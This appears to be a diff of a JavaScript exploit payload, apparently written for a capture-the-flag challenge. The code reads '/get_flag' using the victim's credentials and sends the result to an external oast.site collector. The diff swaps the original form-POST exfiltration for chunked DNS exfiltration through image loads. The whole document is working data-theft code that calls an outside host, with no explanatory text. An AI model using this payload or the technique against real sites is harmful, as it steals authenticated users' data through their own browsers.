@@ -7,17 +7,14 @@ if (window.opener) {
     fetch('/get_flag', { credentials: 'include' })
       .then(r => r.text())
       .then(flag => {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/';
-        
-        const input = document.createElement('input');
-        input.name = 'flag';
-        input.value = btoa(flag);
-        form.appendChild(input);
-
-        document.body.appendChild(form);
-        form.submit();
+        let encoded = btoa(flag).replace(/=/g, ''); // remove padding
+        let chunks = encoded.match(/.{1,32}/g);
+        for (let i = 0; i < chunks.length; i++) {
+          let subdomain = chunks[i] + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
+          let img = document.createElement('img');
+          img.src = 'http://' + subdomain + '/';
+          document.body.appendChild(img);
+        }
       });
   `);
 }
